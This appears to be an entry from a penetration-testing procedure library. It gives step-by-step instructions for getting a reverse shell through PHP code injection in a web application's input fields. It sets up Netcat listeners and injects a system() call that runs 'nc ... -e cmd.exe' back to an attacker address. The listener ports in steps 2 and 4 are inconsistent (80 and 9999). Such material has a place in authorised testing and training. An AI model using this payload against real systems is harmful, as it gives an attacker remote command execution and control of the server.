---
id: 8245f556-0659-4e2a-a3f6-709d7d936741
name: Reverse Shell Through PHP Code Injection
type: procedure
verified: true
submitted: true
created_at: '2020-07-31T18:41:55.942812+00:00'
updated_at: '2023-05-26T01:31:02.487315+00:00'
platforms:
- Web
tags:
- '[[injection]]'
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Reverse Shell]]'
- '[[Web Applications]]'
commands:
- '[[Netcat command to establish connection with listener]]'
- '[[Netcat windows in listening mode on port 80]]'
- '[[Netcat windows reverse shell is observed]]'
---

# Reverse Shell Through PHP Code Injection

**Status**: ✓ Verified

## Summary

PHP code injection allows an attacker to execute code through input fields. 

## Description

# Description

PHP code injection allows an attacker to execute code through input fields.

# Instructions

1. Identify code injection by passing PHP function through input fields. In the below screenshot, the application responded for *phpinfo()* function with the PHP version.

2. To get a reverse shell connection, setup a listener on the remote machine using *Netcat* command as shown below.

**Command** ([[Netcat windows in listening mode on port 80]]):

```bash
nc.exe -nlvp 80
```

3. Insert the below payload through input field to execute *Netcat* command and connect to the remote listener.

**Command** ([[Netcat command to establish connection with listener]]):

```bash
; system ("nc 192.168.11.4 9999 -e cmd.exe")
```

4. The payload is executed and shell is received at the listener.

**Command** ([[Netcat windows reverse shell is observed]]):

```bash
nc.exe -lvp 9999 
```

## Platforms

- Web

## Commands Used

- [[Netcat command to establish connection with listener]]
- [[Netcat windows in listening mode on port 80]]
- [[Netcat windows reverse shell is observed]]

## Tags

- [[injection]]
- [[owasp]]
- [[owasp top 10]]
- [[Reverse Shell]]
- [[Web Applications]]
